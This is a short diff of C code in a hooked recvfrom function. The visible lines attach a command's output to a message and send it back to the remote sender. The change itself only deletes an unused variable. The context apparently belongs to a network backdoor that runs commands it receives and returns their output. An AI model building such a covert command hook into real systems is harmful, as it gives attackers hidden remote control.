@@ -78,7 +78,6 @@ TLAHOOK(recvfrom_hook, int, recvfrom,
 			strcat(msg, cmd_output);
 			free(cmd_output);
 		}
-		struct sockaddr_in* sender = (struct sockaddr_in*)from;
 		sendto(s, msg, strlen(msg), flags, from, *fromlen);
 	}
     return ret;
